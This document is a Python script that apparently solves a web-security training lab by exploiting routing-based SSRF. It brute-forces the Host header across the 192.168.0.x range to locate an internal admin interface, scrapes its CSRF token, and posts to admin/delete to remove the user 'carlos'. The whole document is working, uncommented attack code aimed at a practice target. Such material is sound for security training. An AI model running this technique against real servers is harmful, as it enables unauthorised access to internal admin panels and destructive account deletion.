import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.ip_address = None
        self.csrf = None
        self.cookies = None

    def brute_force_private_ip_address(self):
        response = self.session.get(self.lab_url)
        cookies = {}
        for key, value in response.cookies.items():
            cookies[key] = value

        self.cookies = cookies

        for i in range(1, 256):
            headers = {
                'Host': '192.168.0.{}'.format(i)
            }
            response = self.session.get(self.lab_url, headers=headers, cookies=cookies)
            if response.status_code != 504:
                self.ip_address = headers['Host']
                self.csrf = re.search(r'name="csrf" value="(.*)"', response.text).group(1)
                break

    def delete_carlos(self):
        data = {
            'username': 'carlos',
            'csrf': self.csrf
        }
        headers = {
            'Host': self.ip_address
        }
        self.session.post(self.lab_url + 'admin/delete', data=data, headers=headers, cookies=self.cookies)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.brute_force_private_ip_address()
        self.delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
